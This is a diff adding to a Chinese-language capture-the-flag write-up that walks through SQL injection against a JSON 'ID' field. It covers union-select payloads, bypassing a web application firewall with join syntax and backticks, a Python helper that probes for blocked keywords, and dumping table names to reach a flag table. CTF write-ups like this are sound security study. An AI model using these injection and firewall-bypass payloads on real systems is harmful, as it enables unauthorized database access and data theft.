@@ -99,13 +99,84 @@ if __name__ == '__main__':
 
 尝试`payload1 = '{"ID": "1 and 1=2 #"}'`返回正常结果
 
-再尝试`payload = '{"ID": "1\' and 1=2 #"}'`,返回空。
+再尝试`payload = '{"ID": "1\' or 1=2 #"}'`,返回空。
 
 这么看起来应该是第二个的and有效果，至于第一个为什么能返回正常结果我也不太清楚，下次用php试试。
 
 这里应该就能猜出他这个`ID`是字符型。
 
 #### 继续猜信息
+
+尝试`payload1 = '{"ID": "-1\' union select 1, 2"}'`
+
+返回的结果是`This request has been blocked by the server's application firewall`
+
+看起来还有一层防火墙
+
+稍微尝试了一下，有一些关键字和符号被过滤了，比如`where`, `limit`, `,`, `.`
+
+因为没有逗号，所以改成用join来union
+
+`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select 2 )B );#"}'`
+
+我想用user()和databse()函数来直接回显信息，不知道为什么报错了。
+
+`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select user() )B );#"}'`
+
+加上length()函数有莫名其妙可以了。
+
+`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select length(user()) )B );#"}'`
+
+user()函数返回长度14，盲猜是root@localhost，爆出来应该也没什么意义
+
+然后随手猜了下database(), length = 4，数据库名为ezpz
+
+#### 换方向
+
+flag应该是藏在数据库的某个地方，先查查表名
+
+`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select table_name from information_schema.tables )B );#"}'`
+
+但是这个也被拦截了，那么究竟拦截的是哪个字符串呢，写个函数判断一下
+
+```python
+def get_blocked_word(s):
+    words = s.split(" ")
+    for word in words:
+        payload = '{{"ID": "-1\' union select * from ((select 1)A join (select \'{}\')B);#"}}'.format(word)
+        print(word, injection(payload))
+
+s = "select table_name from information_schema.columns"
+get_blocked_word(s)
+```
+
+输出结果
+
+```
+select select
+table_name table_name
+from from
+information_schema.tables This request has been blocked by the server's application firewall
+```
+
+再改改参数测一下，.asdtables并不会被拦截，那应该是.tables被拦截了
+
+我记得mysql是可以给表名和数据库加上反引号"`"的，试了一下，成功的爆出了表名
+
+![8](./8.png)
+
+随手搜索一下`flag`，发现有张表叫`FlagTableUnguessableEzPZ`，那flag肯定在这张表里了。
+
+`payload = '{"ID": "-1\' union select * from ( (select 1)A join ( select * from FlagTableUnguessableEzPZ )B );#"}'`
+
+跑了一下，flag果然在这
+
+![9](./9.png)
+
+2020/2/17
+
+寒假之前没做完的题，现在想起来才给它做了~
+
 
 
 
